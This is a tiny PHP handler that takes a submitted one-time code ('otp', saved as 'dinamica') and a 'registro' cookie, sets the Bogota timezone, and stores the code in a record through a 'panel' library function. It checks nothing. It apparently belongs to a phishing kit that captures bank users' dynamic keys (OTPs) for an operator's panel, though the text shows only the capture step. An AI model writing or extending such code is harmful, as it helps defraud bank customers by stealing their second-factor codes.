<?php
require('../../panel/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$dinamica = $_POST['otp'];

$registro = $_COOKIE['registro'];

actualizar_registro_otp($registro,$dinamica);

?>